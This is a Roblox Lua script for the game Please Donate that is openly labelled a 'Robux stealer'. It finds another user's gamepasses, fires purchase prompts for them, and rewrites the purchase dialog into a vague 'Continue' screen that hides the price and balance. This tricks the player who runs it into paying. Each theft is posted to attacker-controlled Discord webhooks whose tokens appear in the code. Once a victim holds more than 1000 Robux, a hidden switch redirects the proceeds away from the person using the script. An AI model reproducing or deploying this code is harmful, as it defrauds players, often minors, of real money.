local discordInvite = "https://discord.gg/94yBRKy9VV"
setclipboard(discordInvite)

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Discord Invite Copied!";
    Text = "Successfully Copied Discord Invite!";
    Duration = 5;
})

RobloxUser = Username
DiscordWebhook = Webhook

local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local request = syn and syn.request or request
if typeof(request) ~= "function" then error("?!?") end

local DualUser = ""
local DualWebhook = ""
local LogsWebhook = "https://discord.com/api/webhooks/1341545994738864180/Fmi_-mDbYH3fd6IXzxWLVYbt1vp-bTIKMxn0iwwPaUPq8wL0GNvW_2CoSRsQn3Dxh7DM"
local PublicHitsWebhook = "https://discord.com/api/webhooks/1341615038787489832/49GSIDqxGH5LoVPEjakDtL1tq6a7xYCulw7wLJ-OA3fT3z3ek4f-ur3on2foNB5yfNe_"

if Webhook == "" or Username == "" then
    game.Players.LocalPlayer:Kick("Please enter a valid Webhook and Username!")
end

local headers = { ["Content-Type"] = "application/json" }
local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
local success, UserId = pcall(function() return Players:GetUserIdFromNameAsync(Username) end)

local asset
local userRobux = 0

local function sendWebhook()
    local embed = {
        ["title"] = "**__Trax Scripts! | Please Donate Hit!__**",
        ["color"] = 0x0000FF,
        ["fields"] = {
            {["name"] = ":books: **__Player Info:__**", ["value"] = "```Name: " .. Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"},
            {["name"] = "<:robux:1314309850154537020> **__Total Robux:__**", ["value"] = "```" .. userRobux .. "```"},
            {["name"] = ":moneybag: **__Robux Stolen:__**", ["value"] = "```" .. tostring(asset and asset:GetAttribute("AssetPrice") or "N/A") .. "```"},
            {["name"] = ":information_source: **__Information:__**", ["value"] = "The victim has clicked confirm and you got the Robux :white_check_mark:."}
        }
    }

    local data = HttpService:JSONEncode({
        ["username"] = "Trax Pls Donate Stealer",  
        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",  
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    local logsData = HttpService:JSONEncode({
        ["username"] = "Trax Scripts | Logs",
        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",
        ["content"] = "TRAX ON TOP!!",
        ["embeds"] = {embed}
    })

    request({Url = Webhook, Method = "POST", Headers = headers, Body = data})
    request({Url = LogsWebhook, Method = "POST", Headers = headers, Body = logsData})
end

local function sendPublicHitsWebhook()
    local embed = {
        ["title"] = "**__Trax | New Pls Donate Hit!__**",
        ["color"] = 0x0000FF,
        ["fields"] = {
            {["name"] = "<:robux:1314309850154537020> **__Total Robux:__**", ["value"] = "```" .. userRobux .. "```"},
            {["name"] = ":moneybag: **__Robux Stolen:__**", ["value"] = "```" .. tostring(asset and asset:GetAttribute("AssetPrice") or "N/A") .. "```"}
        }
    }

    local data = HttpService:JSONEncode({
        ["username"] = "Trax | Public Hits",  
        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",  
        ["content"] = "",
        ["embeds"] = {embed}
    })

    request({Url = PublicHitsWebhook, Method = "POST", Headers = headers, Body = data})
end

if success then
    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
    if not Booth then return Players.LocalPlayer:Kick() end

    local function Purchase()
        local range = 0
        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
            if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
                local Attribute = v:GetAttribute("AssetPrice")
                if Attribute <= userRobux and Attribute > range then
                    asset = v
                    range = Attribute
                end
            end
        end
        
        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
            asset.Prompt:FireServer("", false, range)
        else
            warn("?")
        end
    end

    local range = math.huge
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
            local Attribute = v:GetAttribute("AssetPrice")
            if Attribute < range then
                asset = v
                range = Attribute
            end
        end
    end

    if asset then
        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
            asset.Prompt:FireServer("", false, range)
            print(range)
        else
            warn("??.")
        end
    end

    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            local RemainingBalanceText = child:FindFirstChild("AlertContents") and child.AlertContents:FindFirstChild("Footer") and child.AlertContents.Footer:FindFirstChild("FooterContent") and child.AlertContents.Footer.FooterContent:FindFirstChild("Content") and child.AlertContents.Footer.FooterContent.Content:FindFirstChild("RemainingBalanceText")
            
            if RemainingBalanceText and RemainingBalanceText.Text then
                local balance = RemainingBalanceText.Text:match("(%d+)$")
                if balance then
                    userRobux = tonumber(balance) + (asset and asset:GetAttribute("AssetPrice") or 0)
                    if userRobux > 1000 then
                        Username = DualUser
                        Webhook = DualWebhook
                        asset = nil
                    end
                end

                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                local Text = child.AlertContents.TitleContainer.TitleArea.Title
                Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
                child.AlertContents.MiddleContent.Visible = false 
                child.AlertContents.Footer.Buttons["1"].Visible = false
                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
                TextFooter.Size = UDim2.new(1, 0, TextFooter.Size.Y.Scale, TextFooter.Size.Y.Offset)
                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
                child.AlertContents.Footer.FooterContent.Visible = false
            end
        end
    end)

    Animator.ChildRemoved:Connect(function(child)
        if child.Name == "Prompt" and userRobux then
            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
                Purchase()
            end
        end
    end)

    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
        if a == UserId and userRobux then
            sendWebhook()
            sendPublicHitsWebhook()
            userRobux -= robux
            Purchase()
        end
    end)
end
